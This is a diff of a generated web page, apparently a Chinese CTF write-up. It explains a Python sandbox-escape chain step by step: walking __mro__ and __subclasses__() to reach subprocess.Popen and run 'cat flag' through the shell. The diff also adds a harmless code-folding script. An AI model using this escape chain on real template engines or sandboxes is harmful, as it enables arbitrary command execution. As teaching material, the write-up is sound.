-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span></code></pre></div><p>因此：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">mro_tuple = list_class.__mro__  # 输出：(list, object)
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <ol>
 <li><strong><code>[1]</code>（取第二个元素）</strong></li>
@@ -899,59 +642,23 @@
 <ul>
 <li>
 <p>取</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__mro__
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>的第二个元素（即</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>类）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__mro__
+</span></span></code></pre></div><p>的第二个元素（即</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object
+</span></span></code></pre></div><p>类）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">object_class = mro_tuple[1]  # 等价于 object
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <ol>
 <li><strong><code>.__subclasses__()</code></strong></li>
 </ol>
 <ul>
 <li>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>类的</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__subclasses__()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>方法返回</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object
+</span></span></code></pre></div><p>类的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__subclasses__()
+</span></span></code></pre></div><p>方法返回</p>
 <p>所有直接子类的列表</p>
 <p>。这些子类包括 Python 内置的许多类，例如：</p>
 <ul>
@@ -966,17 +673,9 @@
 </li>
 <li>
 <p>其他系统级类</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">subclasses = object_class.__subclasses__()
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 </ul>
@@ -986,35 +685,13 @@
 <ul>
 <li>
 <p>通过索引</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">351
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>定位到</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">subprocess.Popen
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>类：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">351
+</span></span></code></pre></div><p>定位到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">subprocess.Popen
+</span></span></code></pre></div><p>类：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">Popen_class = subclasses[351]
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
+</span></span></code></pre></div><ul>
 <li><strong>关键点</strong>：索引 <code>351</code> 是根据特定 Python 版本和环境确定的。例如，在 Python 3.8 中，<code>subprocess.Popen</code> 的索引可能为 <code>351</code>，但不同版本或环境可能不同。</li>
 </ul>
 </li>
@@ -1025,26 +702,11 @@
 <ul>
 <li>
 <p>使用</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Popen
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>类创建进程对象，执行命令：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Popen
+</span></span></code></pre></div><p>类创建进程对象，执行命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">process = Popen_class(&#39;cat flag&#39;, shell=True, stdout=-1)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
+</span></span></code></pre></div><ul>
 <li><code>'cat flag'</code>：要执行的系统命令。</li>
 <li><code>shell=True</code>：允许通过 shell 执行命令（危险！）。</li>
 <li><code>stdout=-1</code>：等同于 <code>stdout=subprocess.PIPE</code>，捕获标准输出。</li>
@@ -1057,26 +719,11 @@
 <ul>
 <li>
 <p>等待进程完成，并返回</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(stdout_data, stderr_data)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>元组：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(stdout_data, stderr_data)
+</span></span></code></pre></div><p>元组：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">output_tuple = process.communicate()
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <ol>
 <li><strong><code>[0].strip()</code></strong></li>
@@ -1084,26 +731,11 @@
 <ul>
 <li>
 <p>获取标准输出（</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stdout_data
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>）并去除首尾空白字符：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stdout_data
+</span></span></code></pre></div><p>）并去除首尾空白字符：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">result = output_tuple[0].strip()
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 
 </section>
@@ -1327,6 +959,51 @@
         document.head.appendChild(customFont);
     }());
 </script>
+  <script>
+    (function () {
+      const maxHeight = 420;
 
+      function initCodeFold() {
+        document
+          .querySelectorAll(".article-content .highlight")
+          .forEach(function (block) {
+            if (block.dataset.codeFoldInit === "true") return;
+
+            block.dataset.codeFoldInit = "true";
+
+            if (block.scrollHeight <= maxHeight + 40) return;
+
+            const wrapper = document.createElement("div");
+            wrapper.className = "code-fold-wrapper";
+
+            block.parentNode.insertBefore(wrapper, block);
+            wrapper.appendChild(block);
+
+            block.classList.add("code-collapsible", "code-collapsed");
+
+            const button = document.createElement("button");
+            button.type = "button";
+            button.className = "code-toggle-button";
+            button.textContent = "展开代码";
+            button.setAttribute("aria-expanded", "false");
+
+            button.addEventListener("click", function () {
+              const collapsed = block.classList.toggle("code-collapsed");
+
+              button.textContent = collapsed ? "展开代码" : "收起代码";
+              button.setAttribute("aria-expanded", String(!collapsed));
+            });
+
+            wrapper.appendChild(button);
+          });
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initCodeFold);
+      } else {
+        initCodeFold();
+      }
+    })();
+  </script>
     </body>
 </html>
